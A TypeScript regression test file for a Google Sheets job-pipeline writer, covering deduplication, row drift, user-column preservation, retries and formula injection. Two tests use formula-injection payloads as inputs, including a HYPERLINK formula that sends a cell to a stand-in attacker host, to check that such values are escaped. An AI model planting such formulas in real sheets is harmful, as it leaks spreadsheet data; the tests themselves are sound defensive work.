// BEAUDIT lane S: Pipeline writer integrity. Promotes the lane-D audit probes
// p01 (concurrent duplicate append), p02 (row drift), p05 (user columns),
// p06 (formula injection), p11 (full-sheet read) and p12 (half-written
// batches) into regression tests against the in-memory Sheets fake.
import assert from "node:assert/strict";
import test from "node:test";

import {
  SheetWriteError,
  createPipelineWriter,
} from "../../src/sheets/pipeline-writer.ts";
import {
  HEADER,
  createFakeSheets,
  lead,
  pipelineRow,
  runtimeConfig,
} from "./fake-sheets.ts";

const FAST = { retryBaseMs: 1 };

function dataRows(sheet: ReturnType<typeof createFakeSheets>): string[][] {
  return (sheet.tabs.get("Pipeline") || []).slice(1);
}

function isPipelineDataRead(range: string): boolean {
  return range.startsWith("Pipeline!") && !/^Pipeline!A1:/.test(range);
}

test("D1: two concurrent writes of one URL leave exactly one Pipeline row (p01)", async () => {
  const sheet = createFakeSheets({ Pipeline: [HEADER] });
  // Hold the first data read until the second writer also reads, or 50 ms
  // pass (a per-Sheet lock means the second read never comes while held).
  let arrivals = 0;
  let release!: () => void;
  const barrier = new Promise<void>((r) => (release = r));
  sheet.hooks.onRead = async (range) => {
    if (!isPipelineDataRead(range)) return;
    arrivals += 1;
    if (arrivals === 2) release();
    await Promise.race([barrier, new Promise((r) => setTimeout(r, 50))]);
  };
  const w1 = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  const w2 = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  const L = lead({ url: "https://boards.greenhouse.io/acme/jobs/1" });
  const [a, b] = await Promise.all([
    w1.write("fake-sheet", [L]),
    w2.write("fake-sheet", [{ ...L }]),
  ]);
  const rows = dataRows(sheet);
  assert.equal(rows.length, 1, `one row expected, got links ${rows.map((r) => r[4]).join(", ")}`);
  assert.equal(a.appended + b.appended, 1);
  assert.equal(a.updated + b.updated, 1);
});

test("D1: a URL another writer appended after the snapshot is not appended again", async () => {
  const sheet = createFakeSheets({ Pipeline: [HEADER] });
  const url = "https://boards.greenhouse.io/acme/jobs/1";
  let injected = false;
  sheet.hooks.onRead = (range) => {
    if (injected || !isPipelineDataRead(range)) return;
    injected = true;
    // Another process (the dashboard, Hermes) adds the same job right after
    // this writer's snapshot.
    sheet.tabs.get("Pipeline")!.push(pipelineRow({ title: "Engineer", company: "Acme", link: url, status: "Researching" }));
  };
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  const result = await w.write("fake-sheet", [lead({ url })]);
  const rows = dataRows(sheet);
  assert.equal(rows.length, 1, "the late row must not be duplicated");
  assert.equal(rows[0][12], "Researching");
  assert.equal(result.appended, 0);
});

test("D2: a row deleted between the snapshot and the write does not overwrite its neighbour (p02)", async () => {
  const A = pipelineRow({ title: "Alpha role", company: "Alpha", link: "https://alpha.example/jobs/1", status: "New" });
  const B = pipelineRow({ title: "Beta role", company: "Beta", link: "https://beta.example/jobs/2", status: "Interviewing", notes: "Beta: onsite Tue" });
  const C = pipelineRow({ title: "Gamma role", company: "Gamma", link: "https://gamma.example/jobs/3", status: "New" });
  const sheet = createFakeSheets({ Pipeline: [HEADER, A, B, C] });
  let deleted = false;
  sheet.hooks.onRead = (range) => {
    if (deleted || !isPipelineDataRead(range)) return;
    deleted = true;
    sheet.tabs.get("Pipeline")!.splice(1, 1); // the user deletes Alpha mid-run
  };
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  const result = await w.write("fake-sheet", [
    lead({ title: "Beta role", company: "Beta", url: "https://beta.example/jobs/2", location: "", fitScore: 9 }),
  ]);
  const rows = dataRows(sheet);
  assert.deepEqual(rows.map((r) => r[4]), ["https://beta.example/jobs/2", "https://gamma.example/jobs/3"]);
  assert.equal(rows[1][1], "Gamma role", "Gamma must keep its own title");
  assert.equal(rows[1][12], "New");
  assert.equal(rows[0][7], "9", "Beta's Fit Score is updated in Beta's new row");
  assert.equal(rows[0][14], "Beta: onsite Tue");
  assert.equal(result.updated, 1);
});

test("D2: a row whose Link vanished before the write is skipped, not written over", async () => {
  const B = pipelineRow({ title: "Beta role", company: "Beta", link: "https://beta.example/jobs/2", status: "New" });
  const sheet = createFakeSheets({ Pipeline: [HEADER, B] });
  let deleted = false;
  sheet.hooks.onRead = (range) => {
    if (deleted || !isPipelineDataRead(range)) return;
    deleted = true;
    sheet.tabs.get("Pipeline")![1] = pipelineRow({ title: "Other", company: "Other", link: "https://other.example/jobs/9", status: "Applied" });
  };
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  const result = await w.write("fake-sheet", [lead({ title: "Beta role", company: "Beta", url: "https://beta.example/jobs/2" })]);
  const rows = dataRows(sheet);
  const other = rows.find((r) => r[4] === "https://other.example/jobs/9")!;
  assert.equal(other[1], "Other");
  assert.equal(other[12], "Applied");
  assert.equal(result.updated, 0);
  assert.match(result.warnings.join("\n"), /moved or was removed/i);
});

test("D4: re-discovery keeps user-edited Source, Priority, Tags, Fit Assessment and Talking Points (p05)", async () => {
  const url = "https://boards.greenhouse.io/acme/jobs/1";
  const userRow = pipelineRow({
    date: "2026-09-01", title: "Engineer", company: "Acme", location: "Remote", link: url,
    source: "Manual", fit: "9", priority: "🔥", tags: "referral, dream",
    fitAssessment: "User-provided job description:\nFull JD pasted by user...", status: "Researching",
    talking: "my own talking points", notes: "call Sam",
  });
  const sheet = createFakeSheets({ Pipeline: [HEADER, userRow] });
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  await w.write("fake-sheet", [
    lead({ url, fitScore: 6, priority: "⚡", tags: ["backend"], fitAssessment: "LLM: decent fit", talkingPoints: "LLM talking points", logoUrl: "https://logo.example/a.png" }),
  ]);
  const after = dataRows(sheet)[0];
  assert.equal(after[5], "Manual", "Source");
  assert.equal(after[8], "🔥", "Priority");
  assert.equal(after[9], "referral, dream", "Tags");
  assert.equal(after[10], userRow[10], "Fit Assessment (user JD)");
  assert.equal(after[16], "my own talking points", "Talking Points");
  assert.equal(after[12], "Researching", "Status");
  assert.equal(after[14], "call Sam", "Notes");
  // Discovery still owns Fit Score and Logo URL.
  assert.equal(after[7], "6");
  assert.equal(after[19], "https://logo.example/a.png");
});

test("D4: fill-if-empty columns are filled when the user left them blank", async () => {
  const url = "https://boards.greenhouse.io/acme/jobs/1";
  const sheet = createFakeSheets({ Pipeline: [HEADER, pipelineRow({ title: "Engineer", company: "Acme", location: "Remote", link: url, status: "New" })] });
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  await w.write("fake-sheet", [lead({ url, priority: "⚡", tags: ["backend"], fitAssessment: "LLM: decent fit", talkingPoints: "LLM tp" })]);
  const after = dataRows(sheet)[0];
  assert.equal(after[5], "Greenhouse");
  assert.equal(after[8], "⚡");
  assert.equal(after[9], "backend");
  assert.equal(after[10], "LLM: decent fit");
  assert.equal(after[16], "LLM tp");
});

test("D2/D4: a merge writes only the cells that changed, never the whole A:Y row", async () => {
  const url = "https://boards.greenhouse.io/acme/jobs/1";
  const sheet = createFakeSheets({ Pipeline: [HEADER, pipelineRow({ date: "2026-09-01", title: "Engineer", company: "Acme", location: "Remote", link: url, source: "Greenhouse", fit: "5", status: "Applied", notes: "keep" })] });
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  await w.write("fake-sheet", [lead({ url, fitScore: 8, priority: "", tags: [], fitAssessment: "", talkingPoints: "", matchScore: null })]);
  const update = sheet.calls.find((c) => c.kind === "values.batchUpdate");
  assert.ok(update, "the Fit Score change is written");
  const ranges: string[] = JSON.parse(update!.body).data.map((d: { range: string }) => d.range);
  assert.deepEqual(ranges, ["Pipeline!H2"]);
});

test("D5: posting text that starts like a formula is written as text (p06)", async () => {
  const sheet = createFakeSheets({ Pipeline: [HEADER] });
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  await w.write("fake-sheet", [
    lead({
      url: "https://boards.greenhouse.io/evil/jobs/9",
      title: '=HYPERLINK("https://attacker.invalid/?leak="&C2,"Senior Engineer")',
      company: '=IMAGE("https://attacker.invalid/px.gif")',
      fitAssessment: "+SUM(1,2)",
      talkingPoints: "@import",
      location: "-cmd",
    }),
  ]);
  const append = sheet.calls.find((c) => c.kind === "values.append")!;
  const cells: string[] = JSON.parse(append.body).values[0];
  for (const index of [1, 2, 3, 10, 16]) {
    assert.equal(cells[index][0], "'", `cell ${index} must be escaped: ${cells[index]}`);
  }
  // Dates and scores stay typed.
  assert.match(cells[0], /^\d{4}-\d{2}-\d{2}$/);
  assert.equal(cells[7], "7");
});

test("D5: a merged update escapes formula text too", async () => {
  const url = "https://boards.greenhouse.io/acme/jobs/1";
  const sheet = createFakeSheets({ Pipeline: [HEADER, pipelineRow({ title: "Engineer", company: "Acme", location: "Remote", link: url })] });
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  await w.write("fake-sheet", [lead({ url, title: "=IMPORTDATA(\"https://attacker.invalid\")" })]);
  const update = sheet.calls.find((c) => c.kind === "values.batchUpdate")!;
  const values = JSON.parse(update.body).data.flatMap((d: { values: string[][] }) => d.values.flat());
  assert.ok(values.includes("'=IMPORTDATA(\"https://attacker.invalid\")"));
});

test("D17: a write reads identity columns, not the full A2:Y range (p11)", async () => {
  const rows = [HEADER];
  for (let i = 0; i < 20; i += 1) {
    rows.push(pipelineRow({ title: `Old ${i}`, company: `Co${i}`, link: `https://old${i}.example/jobs/${i}`, notes: "x".repeat(200), fitAssessment: "y".repeat(400) }));
  }
  const sheet = createFakeSheets({ Pipeline: rows });
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  await w.write("fake-sheet", [lead({ url: "https://new.example/jobs/1" }), lead({ title: "Old 3", company: "Co3", url: "https://old3.example/jobs/3" })]);
  const readRanges = sheet.calls
    .filter((c) => c.kind === "values.get" || c.kind === "values.batchGet")
    .flatMap((c) => (c.kind === "values.get" ? [c.range] : c.ranges));
  assert.ok(!readRanges.includes("Pipeline!A2:Y"), `full-sheet read found: ${readRanges.join(" ")}`);
  // Only the matched row is fetched in full.
  const fullRowReads = readRanges.filter((r) => /^Pipeline!A\d+:Y\d+$/.test(r) && r !== "Pipeline!A1:Y1");
  assert.deepEqual(fullRowReads, ["Pipeline!A5:Y5"]);
});

test("D12: a failed update phase still appends brand-new leads (p12-1)", async () => {
  const sheet = createFakeSheets({ Pipeline: [HEADER, pipelineRow({ title: "Engineer", company: "Acme", link: "https://acme.example/jobs/1" })] });
  for (let i = 0; i < 5; i += 1) sheet.hooks.failNext.push({ kind: "values.batchUpdate", status: 503, body: "backendError" });
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  await assert.rejects(
    w.write("fake-sheet", [
      lead({ title: "Engineer", company: "Acme", url: "https://acme.example/jobs/1", fitScore: 9 }),
      lead({ title: "New role", company: "Beta", url: "https://beta.example/jobs/2" }),
    ]),
    (error: unknown) => {
      assert.ok(error instanceof SheetWriteError);
      assert.equal(error.phase, "update");
      assert.equal(error.partialResult?.appended, 1);
      assert.equal(error.partialResult?.updated, 0);
      return true;
    },
  );
  assert.deepEqual(dataRows(sheet).map((r) => r[4]), ["https://acme.example/jobs/1", "https://beta.example/jobs/2"]);
});

test("D12: a transient 503 on either phase is retried", async () => {
  const sheet = createFakeSheets({ Pipeline: [HEADER, pipelineRow({ title: "Engineer", company: "Acme", link: "https://acme.example/jobs/1" })] });
  sheet.hooks.failNext.push({ kind: "values.batchUpdate", status: 503 });
  sheet.hooks.failNext.push({ kind: "values.append", status: 429 });
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST });
  const result = await w.write("fake-sheet", [
    lead({ title: "Engineer", company: "Acme", url: "https://acme.example/jobs/1", fitScore: 9 }),
    lead({ title: "New role", company: "Beta", url: "https://beta.example/jobs/2" }),
  ]);
  assert.equal(result.updated, 1);
  assert.equal(result.appended, 1);
  assert.equal(dataRows(sheet).length, 2);
  assert.equal(dataRows(sheet)[0][7], "9");
});

test("D12: an append whose response is lost is a SheetWriteError marked uncertain (p12-3)", async () => {
  const sheet = createFakeSheets({ Pipeline: [HEADER] });
  const lossy = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const response = await sheet.fetchImpl(input, init);
    if (String(input).includes(":append")) throw new TypeError("fetch failed (socket hang up)");
    return response;
  }) as typeof fetch;
  const w = createPipelineWriter(runtimeConfig, { fetchImpl: lossy, ...FAST });
  await assert.rejects(
    w.write("fake-sheet", [lead({ title: "New role", company: "Beta", url: "https://beta.example/jobs/2" })]),
    (error: unknown) => {
      assert.ok(error instanceof SheetWriteError, "must be a SheetWriteError");
      assert.equal(error.phase, "append");
      assert.equal(error.uncertain, true);
      assert.ok(error.partialResult);
      return true;
    },
  );
  // The append was committed and never retried blindly.
  assert.equal(dataRows(sheet).length, 1);
  const retry = await createPipelineWriter(runtimeConfig, { fetchImpl: sheet.fetchImpl, ...FAST }).write(
    "fake-sheet",
    [lead({ title: "New role", company: "Beta", url: "https://beta.example/jobs/2" })],
  );
  assert.equal(retry.appended, 0);
  assert.equal(dataRows(sheet).length, 1);
});
